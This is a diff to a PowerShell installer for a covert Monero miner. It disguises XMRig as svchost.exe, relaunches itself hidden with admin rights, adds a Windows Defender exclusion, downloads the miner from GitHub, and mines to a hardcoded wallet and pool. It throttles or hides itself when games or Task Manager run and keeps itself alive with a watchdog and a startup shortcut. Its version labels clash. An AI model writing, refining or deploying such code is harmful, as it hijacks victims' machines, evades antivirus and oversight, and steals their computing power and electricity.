@@ -9,7 +9,7 @@
     - Process validation
     - Crash recovery
 .NOTES
-    Version: 4.1.0 - ULTRA SAFE + FIXED
+    Version: 4.2.0 - ULTRA SAFE + FIXED
 #>
 
 $ErrorActionPreference = "SilentlyContinue"
@@ -28,11 +28,12 @@ $BINARY = "$BASE\svchost.exe"
 $CONFIG = "$BASE\config.json"
 $LOG    = "$BASE\sys.log"
 $FLAG   = "$BASE\.installed"
-$LOCK_FILE = "$BASE\.lock"
 $WATCHDOG_BAT = "$BASE\watchdog.bat"
 $WATCHDOG_VBS = "$BASE\watchdog.vbs"
 $MLINK_VBS  = "$BASE\mklink.vbs"
 
+$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
+$POOL   = "gulf.moneroocean.stream:10001"
 $THREADS = 4
 $IDLE_CPU = 30
 $GAME_CPU = 15
@@ -68,7 +69,6 @@ $BINARY = "$BASE\svchost.exe"
 $CONFIG = "$BASE\config.json"
 $LOG    = "$BASE\sys.log"
 $FLAG   = "$BASE\.installed"
-$LOCK_FILE = "$BASE\.lock"
 $WATCHDOG_BAT = "$BASE\watchdog.bat"
 $WATCHDOG_VBS = "$BASE\watchdog.vbs"
 $MLINK_VBS  = "$BASE\mklink.vbs"
@@ -114,102 +114,8 @@ function Test-Admin {
     ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-function Get-Lock {
-    try {
-        # Ensure base directory exists FIRST
-        if (-not (Test-Path $BASE)) {
-            New-Item -ItemType Directory -Path $BASE -Force | Out-Null
-        }
-        if (Test-Path $LOCK_FILE) {
-            $pid = Get-Content $LOCK_FILE -ErrorAction SilentlyContinue
-            if ($pid) {
-                $proc = Get-Process -Id $pid -ErrorAction SilentlyContinue
-                if ($proc -and $proc.ProcessName -eq "powershell") { return $false }
-            }
-        }
-        $pid = [System.Diagnostics.Process]::GetCurrentProcess().Id
-        $pid | Out-File -FilePath $LOCK_FILE -Encoding UTF8
-        return $true
-    } catch { return $false }
-}
-
-function Release-Lock { if (Test-Path $LOCK_FILE) { Remove-Item $LOCK_FILE -Force -ErrorAction SilentlyContinue } }
-
-function Write-Log($msg) {
-    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "$ts  $msg" | Out-File -FilePath $LOG -Encoding UTF8 -Append | Out-Null
-}
-
-function Test-Admin {
-    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
-
-function IsGameRunning {
-    $processes = Get-Process -ErrorAction SilentlyContinue
-    foreach ($p in $processes) {
-        $name = $p.ProcessName.ToLower()
-        foreach ($game in $GAME_PROCESSES) {
-            if ($name -eq $game.ToLower()) { return $true }
-        }
-    }
-    return $false
-}
-
-function IsTaskMgrOpen {
-    $processes = Get-Process -ErrorAction SilentlyContinue
-    foreach ($p in $processes) {
-        $name = $p.ProcessName.ToLower()
-        foreach ($tm in $TASKMGR_PROCESSES) {
-            if ($name -eq $tm.ToLower()) { return $true }
-        }
-    }
-    return $false
-}
-
-function Get-OurXmrigPid {
-    $procs = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
-    foreach ($p in $procs) {
-        if ($p.Path -and $p.Path -like "$BASE\*") { return $p.Id }
-    }
-    return $null
-}
-
-function Start-Miner {
-    param($cpuPercent)
-    $logPath = ($BASE + "\sys.log") -replace '\\', '\\'
-    $config = @{
-        autosave = $false; background = $false; colors = $false; "donate-level" = 1
-        "log-file" = ($BASE + "\sys.log") -replace '\\', '\\'
-        "print-time" = 60; retries = 5; "retry-pause" = 5
-        cpu = @{ enabled = $true; "max-threads-hint" = 4; priority = 0; yield = $true; "max-cpu-usage" = $cpuPercent }
-        opencl = @{ enabled = $false }; cuda = @{ enabled = $false }
-        pools = @(@{ url = "gulf.moneroocean.stream:10001"; user = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"; pass = $worker; keepalive = $true; tls = $false })
-    }
-    $json = $config | ConvertTo-Json -Depth 5
-    [System.IO.File]::WriteAllText($CONFIG, $json, [System.Text.UTF8Encoding]::UTF8)
-    
-    $proc = Start-Process -FilePath $BINARY -ArgumentList "--config=`"$CONFIG`"" -WindowStyle Hidden -PassThru
-    return $proc
-}
-
-function Get-OurMinerPid {
-    $procs = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
-    foreach ($p in $procs) {
-        if ($p.Path -and $p.Path -like "$BASE\*") { return $p.Id }
-    }
-    return $null
-}
-
-function Stop-OurMiner {
-    $pid = Get-OurMinerPid
-    if ($pid) { Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue; Start-Sleep 2 }
-}
-
 # ─── ENSURE BASE DIRECTORY EXISTS FIRST ───────────────────────────────────
 New-Item -ItemType Directory -Path $BASE -Force | Out-Null
-
-# ─── LOCK CHECK ──────────────────────────────────────────────────────────
-if (-not (Get-Lock)) { Write-Log "Another installer running, exiting"; exit 0 }
 
 # ─── CHECK IF ALREADY INSTALLED ──────────────────────────────────────────
 if ((Test-Path $FLAG) -and (Test-Path $BINARY)) {
@@ -223,7 +129,7 @@ if ((Test-Path $FLAG) -and (Test-Path $BINARY)) {
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""; exit 0
 }
-Write-Log "=== INSTALLER STARTED (v4.1 FIXED) ==="
+Write-Log "=== INSTALLER STARTED (v4.3 FIXED) ==="
 
 # ─── DEFENDER EXCLUSION ───────────────────────────────────────────────────
 try {
@@ -232,18 +138,18 @@ try {
     Write-Log "Defender exclusion added"
 } catch { Write-Log "Defender exclusion failed" }
 
-# ─── KILL EXISTING ───────────────────────────────────────────────────────
+# ─── STOP EXISTING ───────────────────────────────────────────────────────
 Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
 Start-Sleep 2
 
 # ─── DOWNLOAD XMRIG ───────────────────────────────────────────────────────
 $zipPath = "$BASE\sys.zip"
-$headers = @{"User-Agent" = "SysOpt/4.1"}
+$headers = @{"User-Agent" = "SysOpt/4.3"}
 
 function Try-Download($repo, $pattern, $sourceName) {
     try {
         Write-Log "Checking $sourceName..."
-        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers @{"User-Agent"="SysOpt/4.1"} -TimeoutSec 20
+        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers @{"User-Agent"="SysOpt/4.3"} -TimeoutSec 20
         $asset = $rel.assets | Where-Object { $_.name -match $pattern -and $_.name -notmatch "sha256" } | Select-Object -First 1
         if ($asset) {
             $version = $rel.tag_name -replace '^v', ''
@@ -317,7 +223,7 @@ try {
 Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
 Start-Sleep 2
 
-# ─── WATCHDOG (SINGLE, SIMPLE, RELIABLE) ����������������������������������
+# ─── WATCHDOG (SINGLE, SIMPLE, RELIABLE) ────────────────────────────────
 $bat = "@echo off`n:loop`ntasklist /FI `"`IMAGENAME eq svchost.exe`" 2>NUL | find /I `"`svchost.exe`" >NUL`nif errorlevel 1 (start `"`" /MIN `"`$BASE\svchost.exe`" --config=`"`$BASE\config.json`"`) `ntimeout /t 60 /nobreak >NUL`ngoto loop"
 [System.IO.File]::WriteAllText("$BASE\watchdog.bat", $bat, [System.Text.UTF8Encoding]::UTF8)
 $vbs = 'Set s=CreateObject("WScript.Shell"):s.Run """' + "$BASE\watchdog.bat" + '""",0,False'
@@ -341,7 +247,7 @@ $lnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialF
 [System.IO.File]::WriteAllText("$BASE\mklink.vbs", $lnkVbs, [System.Text.UTF8Encoding]::UTF8)
 & wscript.exe "$BASE\mklink.vbs"
 
-# ─── START WATCHDOG ��������������������������������������������������������
+# ─── START WATCHDOG ──────────────────────────────────────────────────────
 Start-Sleep 1
 & wscript.exe "$BASE\watchdog.vbs"
 Write-Log "Watchdog started"
